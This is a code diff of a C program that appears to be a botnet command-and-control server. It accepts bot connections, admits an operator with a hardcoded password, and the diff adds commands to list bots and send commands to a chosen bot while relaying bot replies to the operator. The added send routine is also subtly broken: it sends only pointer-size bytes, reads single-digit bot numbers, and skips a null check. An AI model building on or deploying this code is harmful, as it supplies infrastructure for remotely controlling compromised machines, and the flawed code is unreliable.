@@ -18,13 +18,10 @@
 int main() {
     int server_socket, client_socket[30], new_socket, authorized_socket;
     int max_clients = 30, max_sd, addrlen, sd, activity, i, valread;
-    int enabled = 1, recv_length=1, con_clients=0;
-    socklen_t sin_size;
+    int enabled = 1, con_clients=0;
     char buffer[1024]; // 1KB DATA BUFFER
     char password[] = "password\r\n";
     char *clientlist;
-    int command; // COMMAND FROM SERVER INPUT
-    int debug = 1;
     fd_set readfds;    // SET FILE DESCRIPTORS FOR FUTURE CONNECTIONS
 
     pbanner();
@@ -35,23 +32,20 @@ int main() {
         client_socket[i] = 0;               // INITIALIZE ALL CLIENT SOCKETS
     }
 
-    if((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-        fatal("SERVER SOCKET COULD NOT BE STARTED\n");
-
-
-    if(setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &enabled, sizeof(int)) == -1)
-        fatal("SETTING OPTION SO_REUSEADDR FAILED\n");
-        // ALLOW PROGRAM TO TAKE CONTROL OF PORT EVEN IF IT SEEMS IN USE
-
     struct sockaddr_in host_addr, client_addr;
     host_addr.sin_family = AF_INET;
     host_addr.sin_port = htons(PORT);
     host_addr.sin_addr.s_addr = INADDR_ANY;
-    memset(&(host_addr.sin_zero), '\0', 8); // SET REST OF HOST_ADDR TO 0
+    memset(&(host_addr.sin_zero), '\0', 8);
 
-    if(bind(server_socket, (struct sockaddr*) &host_addr, sizeof(host_addr)) == -1) {
+    if((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+        fatal("SERVER SOCKET COULD NOT BE STARTED\n");
+
+    if(setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &enabled, sizeof(int)) == -1)
+        fatal("SETTING OPTION SO_REUSEADDR FAILED\n");
+
+    if(bind(server_socket, (struct sockaddr*) &host_addr, sizeof(host_addr)) == -1)
         fatal("SERVER COULD NOT BIND TO HOST ADDRESS\n");
-    }
 
     if(listen(server_socket, 5) == -1)
         fatal("SERVER COULD NOT COMMENCE LISTENING\n");
@@ -78,7 +72,6 @@ int main() {
                 max_sd = sd;
         }
 
-        // int select(int nfds, fd_set *readfds, fd_set *writefds,fd_set *exceptfds, struct timeval *timeout);
         // WAIT FOR ACTIVITY, TIMEOUT IS NULL
         activity = select( max_sd + 1, &readfds, NULL, NULL, NULL);
 
@@ -97,8 +90,10 @@ int main() {
 
                 con_clients++;
 
+
+
             for(i = 0; i < max_clients; i++) {
-                if(client_socket[i] == 0)       // IF CLIENT SOCKET I IS CLEAR
+                if(client_socket[i] == 0)       // IF CLIENT SOCKET IS NOT USED
                 {
                     client_socket[i] = new_socket;
                     printf("[--] ADDING TO LIST OF SOCKETS AS %d\n", i);
@@ -113,6 +108,7 @@ int main() {
 
             if(FD_ISSET(sd, &readfds))
             {
+
                 if((valread = read(sd, buffer, 1024)) == 0) // IF SOCKET REPLIES ZERO
                 {
                     getpeername(sd, (struct sockaddr*)&client_addr, (socklen_t*)&addrlen);
@@ -124,6 +120,7 @@ int main() {
                     close(sd);
                     client_socket[i] = 0;
                 }
+
                 else if (client_socket[i] == authorized_socket) {
                     buffer[valread] = '\0';
                     printf("[--] Command from %s:%d > %s", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), buffer);
@@ -141,6 +138,21 @@ int main() {
                                 }
                             }
                         }
+                    }
+
+                    // SEND COMMAND TO CLIENT  [SEND <CLIENT_FD>:<MESSAGE>]
+                    else if(strncmp(buffer, "send", strlen("send")) == 0) {
+                        int x = buffer[5] - '0';
+                        char *a = strchr(buffer, ':');
+                        *a = '\0';
+                        printf("%d : %s\r\n", x, a + 1);
+                        send(client_socket[x], a + 1, sizeof(a + 1), 0);
+                    }
+
+                    // LIST ALL AVAILABLE COMMANDS
+                    else if(strncmp(buffer, "help", strlen("help")) == 0) {
+                        send(authorized_socket, "list [lists bots]\r\n", strlen("list [lists bots]\r\n"), 0);
+                        send(authorized_socket, "send <bot number>:<message> [sends a command to a bot]\r\n", strlen("send <bot number>:<message> [sends a command to a bot]\r\n"), 0);
                     }
 
                     // MORE COMMANDS..
@@ -161,7 +173,8 @@ int main() {
                 else {  // ECHO BACK MESSAGE
                     buffer[valread] = '\0';
                     printf("[--] Message from %s:%d > %s", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), buffer);
-                    send(sd, buffer, strlen(buffer), 0);
+                    if(authorized_socket != 0)
+                        send(authorized_socket, buffer, strlen(buffer), 0);
                 }
             }
         }
